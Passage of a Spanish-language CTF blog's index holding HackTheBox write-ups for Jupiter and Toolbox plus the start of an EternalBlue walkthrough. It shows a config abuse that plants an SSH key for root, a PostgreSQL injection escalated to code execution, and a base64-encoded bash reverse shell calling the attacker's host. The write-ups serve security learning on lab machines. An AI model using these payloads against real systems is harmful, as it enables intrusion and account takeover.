/usr/local/bin/sattrack Satellite Tracking System Configuration file has not been found. Please try again! Vamos a probar de ver desde donde lo está cargando con el comando strings. El comando strings es básicamente como un cat, pero que solo muestra el contenido legible de archivos como binarios, fotografias, etc..\nstrings /usr/local/bin/sattrack | grep config /tmp/config.json Vemos la ruta /tmp/config.json, pero claro, no existe, lo que podemos hacer es buscar en el sistema si existe algún config.json que sea la configuración default para este binario\n$ find / -name config.json 2\u0026gt; /dev/null /usr/local/share/sattrack/config.json El comando find nos reporta un config.json que está en una carpeta que se llama igual que el binario así que supongo que tendrán algo que ver, vamos a copiar ese archivo al /tmp\ncp /usr/local/share/sattrack/config.json /tmp/config.json Ahora ya podemos ejecutar el binario, pero se queda colgado cargando el recurso de una web.\n$ sudo /usr/local/bin/sattrack Satellite Tracking System tleroot does not exist, creating it: /tmp/tle/ Get:0 http://celestrak.org/NORAD/elements/weather.txt Vamos a ver si podemos modificar esto desde el archivo config.json\n{ \u0026#34;tleroot\u0026#34;: \u0026#34;/tmp/tle/\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;weather.txt\u0026#34;, \u0026#34;mapfile\u0026#34;: \u0026#34;/usr/local/share/sattrack/map.json\u0026#34;, \u0026#34;texturefile\u0026#34;: \u0026#34;/usr/local/share/sattrack/earth.png\u0026#34;, \u0026#34;tlesources\u0026#34;: [ \u0026#34;http://celestrak.org/NORAD/elements/weather.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/noaa.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink\u0026amp;FORMAT=tle\u0026#34; ], \u0026#34;updatePerdiod\u0026#34;: 1000, \u0026#34;station\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;LORCA\u0026#34;, \u0026#34;lat\u0026#34;: 37.6725, \u0026#34;lon\u0026#34;: -1.5863, \u0026#34;hgt\u0026#34;: 335.0 }, \u0026#34;show\u0026#34;: [ ], \u0026#34;columns\u0026#34;: [ \u0026#34;name\u0026#34;, \u0026#34;azel\u0026#34;, \u0026#34;dis\u0026#34;, \u0026#34;geo\u0026#34;, \u0026#34;tab\u0026#34;, \u0026#34;pos\u0026#34;, \u0026#34;vel\u0026#34; ] } En tlsources están las webs que estaba cargando el binario, como nosotros tenemos permisos para modificar este script podemos probar de poner nuestra ip y abrirnos un servidor con python (python3 -m http.server 80) para ver si recibimos la petición\njovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack Satellite Tracking System Get:0 http://10.10.14.28 python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.216 - - [01/Nov/2023 21:25:27] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - Efectivamente recibimos la petición. Ahora podríamos probar de poner en vez de nuestra ip poner file:///root/root.txt\nDespués de ejecutarlo tenemos la flag de root en /tmp/tle/root.txt\nYa tenemos la flag, pero la gracia es tener una consola como root así que lo que vamos a hacer es generarnos unas llaves de ssh en nuestra máquina\nssh-keygen Ahora dentro de nuestro directorio personal tenemos una carpeta .ssh y dentro están las llaves, vamos a copiar la llave pública ìd_rsa.pub y la vamos a poner en un archivo llamado authorized_keys, en ese mismo directorio nos vamos a montar otro servidor con python python3 -m http.server 80\nEn la máquina víctima vamos a modificar un poco el archivo /tmp/config.json, en la opción tle root podemos poner en que ruta queremos que se descarguen los archivos, ahí vamos a poner la ruta de las llaves de root\n\u0026#34;tleroot\u0026#34;: \u0026#34;/root/.ssh/\u0026#34;, Por último en tlesources pondremos nuestra ip y el archivo authorized_keys\n\u0026#34;http://10.10.14.28/authorized_keys\u0026#34; Ahora al ejecutar el programa se pondrá nuestra llave pública dentro de las authorized_keys de root lo que nos va a permitir conectarnos por ssh sin la necesidad de proporcionar contraseña\nssh root@10.10.11.216 root@jupiter:~# ","date":"2023-11-01","id":64,"permalink":"/writeups/hackthebox/jupiter/","summary":"En la máquina de hoy vamos a estar tocando enumeración de subdominios, derivaremos una inyección postgresql a un RCE. Y para la escalada tocaremos tareas cron, portfordwarding y python","tags":["CTF","RCE","SQLI","Cron","Port forwarding","Python"],"title":"Jupiter"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.236 PING 10.10.10.236 (10.10.10.236) 56(84) bytes of data. 64 bytes from 10.10.10.236: icmp_seq=1 ttl=127 time=152 ms --- 10.10.10.236 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 151.535/151.535/151.535/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.236 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\nextractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.236 5 │ [*] Open ports: 21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; nmap -p21,22,135,139,443,445,5985,47001,49664,49665,49666,49667,49668,49669 -sCV 10.10.10.236 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA) | 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA) |_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.38 (Debian) |_ssl-date: TLS randomness does not represent time |_http-title: MegaLogistics | ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR | Not valid before: 2020-02-18T17:45:56 |_Not valid after: 2021-02-17T17:45:56 445/tcp open microsoft-ds? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-10-29T20:34:08 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: 1s Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos FTP Nmap a reportada que en el puerto 21 (FTP) está el login Anonymous habilitado. Esto significa que podemos entrar con el usuario anonymous sin necesidad de proporcionar contraseña. Una vez conectados vemos un archivo llamado docker-toolbox.exe que de momento no podemos hacer nada con él, pero no lo olvidaremos 😉\n$ ftp 10.10.10.236 Connected to 10.10.10.236. Name (10.10.10.236:d3b0o): anonymous 331 Password required for anonymous Password: 230 Logged on ftp\u0026gt; ls -r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe SMB El nmap también reporto que había un smb corriendo en la máquina víctima. Con un crackmapexec vemos un poco más de información sobre la máquina víctima\u0026hellip;\ncrackmapexec smb 10.10.10.236 SMB 10.10.10.236 445 TOOLBOX [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False) Ahora podríamos probar de listar los recursos compartidos en el smb para ello vamos a usar distintas herramientas, pero no tenemos permisos para enumerar los recursos así que no podemos tirar por aquí tampoco\nSmbclient\rCrackmapexec\rSmbmap\r$ smbclient -L 10.10.10.236 -N session setup failed: NT_STATUS_ACCESS_DENIED $ crackmapexec smb 10.10.10.236 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.236 445 TOOLBOX [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False) SMB 10.10.10.236 445 TOOLBOX [-] Toolbox\\: STATUS_ACCESS_DENIED SMB 10.10.10.236 445 TOOLBOX [-] Error enumerating shares: Error occurs while reading from remote(104) $ smbmap -H 10.10.10.236 ________ ___ ___ _______ ___ ___ __ _______ /\u0026#34; )|\u0026#34; \\ /\u0026#34; || _ \u0026#34;\\ |\u0026#34; \\ /\u0026#34; | /\u0026#34;\u0026#34;\\ | __ \u0026#34;\\ (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /\u0026#39; /\\ \\ |: ____/ __/ \\ |: \\. |(| _ \\ |: \\. | // __\u0026#39; \\ (| / /\u0026#34; \\ :) |. \\ /: ||: |_) :)|. \\ /: | / / \\ \\ /|__/ \\ (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______) ----------------------------------------------------------------------------- SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com https://github.com/ShawnDEvans/smbmap [*] Detected 1 hosts serving SMB [*] Established 0 SMB session(s) HTTPS Volviendo al escaneo de nmap, hay una línea en el resultado del puerto 443 que dice lo siguiente\nssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR Así que vamos a añadir este dominio en el /etc/hosts\n10.10.10.236 megalogistic.com admin.megalogistic.com En la web admin.megalogistic.com vemos un panel de login. Al probar la tipica inyección sql ' or 1=1-- - en el campo del usuario vemos que podemos iniciar sesión satisfactoriamente. En la web no podemos sacar mucha información, simplemente podemos ver el desarrollador y la versión (MegaCorp 1.0.0) y un to-do que dice lo siguiente:\nEnviar credenciales a Tony Actualizar los drivers de la impresora Intrusión En el panel anterior se pueden probar más cositas, de momento solo hemos probado de iniciar sesión con el 'or 1=1-- -, pero a lo mejor podemos hacer más cositas.\nEmpezamos poniendo una comilla para ver si sale algún error legible de la base de datos.\nWarning: pg_query(): Query failed: ERROR: unterminated quoted string at or near \u0026#34;\u0026#39;\u0026#39;\u0026#39; AND password = md5(\u0026#39;\u0026#39;);\u0026#34; LINE 1: SELECT * FROM users WHERE username = \u0026#39;\u0026#39;\u0026#39; AND password = md5(... ^ in /var/www/admin/index.php on line 10 Warning: pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11 Efectivamente, sale un error en el cual sale pg_query() con esto sabemos que estamos ante un PostgreSQL\nPara saber como hacer una inyección a un PostgreSQL existe un recurso muy interesante de la repo de Payloads All The Things, en el cual se menciona una vulnerabilidad interesante que consiste en derivar la inyección sql a un rce (Remote Code Execution)\nBásicamente, consiste en crear una tabla en la base de datos en uso por la web\nCREATE TABLE cmd_exec(cmd_output text); Mediante COPY se pondrá en la tabla el resultado del comando id, lo que provocará que se ejecute el comando ìd\nCOPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;; De forma opcional, en el caso de que podamos ver el output lo podríamos ver simplemente haciendo una petición a la tabla cmd_exec\nSELECT * FROM cmd_exec; Sabiendo esto vamos con la explotación:\nPrimero se intercepta la petición con burpsuite y la mandamos al repeter para trabajar mejor. En el apartado username vamos a añadir una comilla para cerrar la del username y despues vamos a poner un ; para hacer otra petición. Ahora ya podemos poner la petición que realizara la inyección CREATE TABLE cmd_exec(cmd_output text);. Por último al final se comenta con un -- - para que ignore la siguiente parte de la querry de verificación de la password (Si esto no te queda claro tengo un video en mi canal de youtube en el cual explico en 6 minutos como funcionan las inyecciones sql)\nusername=\u0026#39;;+CREATE+TABLE+cmd_exec(cmd_output text)-- - Ahora ya tenemos la tabla cmd_exec creada\nReverse Shell Sabiendo que la máquina es windows si queremos mandarnos una reverse shell tenemos que compartir con un samba el ejecutable de netcat (nc.exe). Si estás desde un kali o parrot seguramente ya lo tendrás instalado lo puedes encontrar con un locate nc.exe. Ahora, ya desde el mismo directorio que tenemos el nc.exe podemos abrir el servidor samba de la siguiente forma:\nimpacket-smbserver smb $(pwd) --smb2support Explicación parámetros\r${pwd}: Esto equivale a poner la ruta actual de trabajo, en este comando nos sirve para decir donde queremos que abra el servidor samba \u0026ndash;smb2support: Sirve para habilitar el soporte de la versión 2 de samba Ahora nos ponemos en escucha por el puerto 443 para recibir la reverse shell\nnc -nlvp 443 Explicación parámetros\rn: Sirve para que no haga la resolución de DNS l: Habilitar modo escucha de netcat v: Verbose, modo detallado de netcat p: Por último la p sirve para especificar el número de puerto en el cual vamos a estar en escucha Teniendo el servidor samba abierto y estando en escucha ya podemos mandar la reverse shell mediante la inyección sql.\nusername=\u0026#39;;+COPY+cmd_exec+FROM+PROGRAM+\u0026#39;//10.10.14.28/nc.exe+-e+cmd.exe+10.10.14.28+443\u0026#39;-- -\u0026amp;password=test No recibimos nada\u0026hellip;\nA lo mejor, por mucho que la máquina sea windows tiene un docker así que podemos probar de en vez de mandar la reverseshell con un netcat en un samba, mandarla directamente con bash\nLa típica reverse shell de bash es: bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1, pero lo pondremos dentro de bash -c \u0026quot;bash- i...\u0026quot; porque puede ser que la normal la bloquee la máquina víctima. En resumen quedará así:\nbash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34; Antes de aplicarlo a la inyección vamos a convertirlo en base64 para evitar que los caracteres especiales den problemas.\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.28/443 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | base64 Ahora ya tenemos el base64 generado, pero hay un + en la cadena, el cual podemos sustituir por un %2b. El comando final que tendremos que poner en la inyección seria, primero un echo con el base64, después un base64 -d para decodear el base64 y por último bash para que el resultado del base64 lo ejecute con bash.\necho \u0026#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK\u0026#34; | base64 -d | bash Esto aplicado a la inyección se vería de la siguiente forma:\nusername=\u0026#39;;+COPY+cmd_exec+FROM+PROGRAM+\u0026#39;echo+\u0026#34;YmFzaCAtYyAiYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMSIK\u0026#34;+|+base64+-d+|+bash\u0026#39;--+- ¡¡¡¡Recibimos la conexión!!!!!\nAntes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export TERM=xterm export SHELL=bash Escalada de privilegios Podemos identificar que estamos en un docker porque en la raíz está el archivo .dockerenv\npostgres@bc56e3cc55e9:/$ ls -la total 80 drwxr-xr-x 1 root root 4096 Mar 29 2021 . drwxr-xr-x 1 root root 4096 Mar 29 2021 .. -rwxr-xr-x 1 root root 0 Mar 29 2021 .dockerenv drwxr-xr-x 1 root root 4096 Feb 19 2020 bin drwxr-xr-x 2 root root 4096 Nov 10 2019 boot drwxr-xr-x 5 root root 340 Oct 30 20:54 dev ... Si hacemos una búsqueda por google podemos encontrar unas credenciales por default del ssh en los boot2docker (web)\nuser: docker pass: tcuser Si miramos que ip tenemos con ifconfig, vemos la 172.17.0.2, la gateway seguramente será la 172.17.0.1\npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) RX packets 1338 bytes 183525 (179.2 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 1163 bytes 173814 (169.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 3461 bytes 1232799 (1.1 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 3461 bytes 1232799 (1.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Así que nos podemos conectar a la máquina host del docker con ssh docker@172.17.0.1\npostgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ ssh docker@172.17.0.1 docker@172.17.0.1\u0026#39;s password: ( \u0026#39;\u0026gt;\u0026#39;) /) TC (\\ Core is distributed with ABSOLUTELY NO WARRANTY. (/-_--_-\\) www.tinycorelinux.net docker@box:~$ Escalada root/Administrator Si hacemos un sudo -l para ver que podemos ejecutar con sudo, nos muestra que podemos ejecutar todos los comandos como root sin la necesidad de proporcionar contraseña.\ndocker@box:~$ sudo -l User docker may run the following commands on this host: (root) NOPASSWD: ALL docker@box:~$ Sabiendo esto simplemente podemos poner sudo bash y ya seremos root\ndocker@box:~$ sudo bash root@box:/home/docker# Al investigar un poco los archivo de la raíz se puede ver que hay un directorio llamado c en el cual hay una estructura de carpetas parecida a la de windows, ahí podemos encontrar la flag final\nroot@box:/c/Users/Administrator/Desktop# ls desktop.ini root.txt root@box:/c/Users/Administrator/Desktop# Y ya tendríamos la flag de root.txt\nComo extra, en el directorio /c/Windows/Users/.ssh podemos ver una llave privada de ssh la cual podemos usar para salir del docker e ir a la máquina host. Para usarla tenemos que guardarla en un archivo en nuestra máquina\nPara que no de problemas le tenemos que dar permisos\nchmod 600 id_rsa Ahora ya nos podemos conectar por ssh como Administrator en la máquina víctima con el siguiente comando\nssh -i id_rsa Administrator@10.10.10.236 Y ya tenemos una consola como Administrator en la máquina víctima\n$ ssh -i id_rsa Administrator@10.10.10.236 administrator@TOOLBOX C:\\Users\\Administrator\u0026gt; ","date":"2023-10-29","id":65,"permalink":"/writeups/hackthebox/toolbox/","summary":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.236 PING 10.","tags":["CTF","RCE","SQLI","Docker"],"title":"Toolbox"},{"content":"\rMe llamo Arnau y tengo 17 años. Dentro de la informática lo que mas me llama la atención es la ciberseguridad, por eso dedico mi tiempo libre a aprender de forma autodidacta este campo a través de ctf's, mi objetivo es irme sacando certificaciones e ir aprendiendo cada día más.\rMis Proyectos Creación de máquinas/retos Estas són las máquinas/retos que he creado\nNombre Plataforma Técnicas Caissa\n2024 (Reto en espera) HackTheBox Secret Athena\n2024 (Reto evaluating) HackTheBox Secret Bigotis\n2025 (Provisionalmente aceptada) HackTheBox Secret Hermes\n2024 (Provisionalmente aceptada) HackTheBox Secret Logan 2\n2023 HackMyVM SQLI User-Agent - LFI - Log Poisoning (Apache) - Funciones de PHP para ejecutar comandos deshabilitadas - CVE-2020-14144 Gitea 1.12.5 (RCE Authenticated) - SSTI Logan\n2023 HackMyVM - Subdomain enum - LFI - Log Poisoning (SMTP) - Sudo vim - Python command injection Influencer\n2023 HackMyVM - Esteganografía - Fuerza bruta con diccionario hecho con cups - Sudo Exiftool - Modificación /etc/hosts Creación de contenido Web: Esta web la cree con el objetivo de subir publicaciones sobre ciberseguridad, Linux y programación. Más adelante me empecé a subir también resoluciones de máquinas de HackTheBox, TryHackMe y HackMyVm\nYoutube: Hace un tiempo aposté por la creación de contenido audiovisual, ya que es más ameno de ver y se me hace más fácil explicarme a la hora de resolver una máquina. Pero hacer los videos me consumía mucho tiempo y dejé de subir writeups en formato video y ahora solo subo con poca frecuencia videos cortos y amenos de ver que expliquen vulnerabilidades en concreto\nCertificaciones Actualmente poseo las siguientes certificaciones\neWPT Web Application Penetration Tester\neJPTv2 Junior Penetration Tester\n","date":"2023-09-07","id":66,"permalink":"/about/","summary":"Me llamo Arnau y tengo 17 años. Dentro de la informática lo que mas me llama la atención es la ciberseguridad, por eso dedico mi tiempo libre a aprender de forma autodidacta este campo a través de ctf's, mi objetivo es irme sacando certificaciones e ir aprendiendo cada día más.","tags":[],"title":"About me"},{"content":"","date":"2023-09-07","id":67,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":68,"permalink":"/","summary":"","tags":[],"title":"d3bo"},{"content":" ","date":"2023-08-30","id":69,"permalink":"/writeups/hackthebox/pandora-video/","summary":" ","tags":[],"title":"Pandora (Video)"},{"content":" ","date":"2023-08-29","id":70,"permalink":"/writeups/hackthebox/horizontall-video/","summary":" ","tags":[],"title":"Horizontall (Video)"},{"content":" ","date":"2023-08-28","id":71,"permalink":"/writeups/hackthebox/bashed-video/","summary":" ","tags":[],"title":"Bashed (Video)"},{"content":" ","date":"2023-08-27","id":72,"permalink":"/writeups/hackmyvm/friendly-iii-video/","summary":" ","tags":[],"title":"Friendly III (Video)"},{"content":" ","date":"2023-06-03","id":73,"permalink":"/writeups/hackmyvm/visions-video/","summary":" ","tags":[],"title":"Visions (Video)"},{"content":" ","date":"2023-06-02","id":74,"permalink":"/writeups/hackmyvm/friendly-ii-video/","summary":" ","tags":[],"title":"Friendly II (Video)"},{"content":" ","date":"2023-06-01","id":75,"permalink":"/writeups/hackmyvm/five-video/","summary":" ","tags":[],"title":"Five (Video)"},{"content":" ","date":"2023-05-31","id":76,"permalink":"/writeups/hackmyvm/doc-video/","summary":" ","tags":[],"title":"Doc (Video)"},{"content":" ","date":"2023-05-05","id":77,"permalink":"/writeups/hackmyvm/literal-video/","summary":" ","tags":[],"title":"Literal (Video)"},{"content":" ","date":"2023-04-19","id":78,"permalink":"/writeups/hackmyvm/jabita-video/","summary":" ","tags":[],"title":"Jabita (Video)"},{"content":" ","date":"2023-03-30","id":79,"permalink":"/writeups/hackmyvm/friendly-i-video/","summary":" ","tags":[],"title":"Friendly I (Video)"},{"content":" ","date":"2023-03-27","id":80,"permalink":"/writeups/hackmyvm/uvalde-video/","summary":" ","tags":[],"title":"Uvalde (Video)"},{"content":" ","date":"2023-03-22","id":81,"permalink":"/writeups/hackmyvm/w140-video/","summary":" ","tags":[],"title":"W140 (Video)"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.220.86 PING 10.10.220.86 (10.10.220.86) 56(84) bytes of data. 64 bytes from 10.10.220.86: icmp_seq=1 ttl=125 time=311 ms --- 10.10.220.86 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 310.739/310.739/310.739/0.000 ms En este caso da un ttl (time to live) de 127, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Windows por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.220.86 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n$ extractPorts allPorts ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.220.86 5 │ [*] Open ports: 135,139,445,3389,49153,49154,49158,49161 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n$ nmap -p135,139,445,3389,49153,49154,49158,49161 -sC -sV 10.10.220.86 -oN versions PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2023-03-13T21:38:54+00:00; +2s from scanner time. | ssl-cert: Subject: commonName=Jon-PC | Not valid before: 2023-03-12T18:12:17 |_Not valid after: 2023-09-11T18:12:17 | rdp-ntlm-info: | Target_Name: JON-PC | NetBIOS_Domain_Name: JON-PC | NetBIOS_Computer_Name: JON-PC | DNS_Domain_Name: Jon-PC | DNS_Computer_Name: Jon-PC | Product_Version: 6.1.7601 |_ System_Time: 2023-03-13T21:38:43+00:00 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h00m01s, deviation: 2h14m10s, median: 1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02c0de388f81 (unknown) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2023-03-13T21:38:42 |_ start_date: 2023-03-13T18:31:03 | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-03-13T16:38:42-05:00 Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Intrusión El escaneo de nmap ha reportado que es un windows 7 con un servidor samba\nCon nmap podemos ver si es vulnerable\n❯ nmap --script \u0026#34;vuln and safe\u0026#34; -p445 10.10.220.86 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 22:53 CET Nmap scan report for 10.10.220.86 Host is up (0.37s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 Es vulnerable. Ahora vamos a usar un exploit de metasploit\nPrimero abrimos metasploit\nmsfconsole Buscamos exploits para ms17-010\nmsf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Vamos a usar el primero\nuse 0 Ponemos la ip de la víctima\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhost 10.10.220.86 rhost =\u0026gt; 10.10.220.86 Especificamos la ip y el puerto en el que vamos a estar en escucha\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.2.28.215 lhost =\u0026gt; 10.2.28.215 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lport 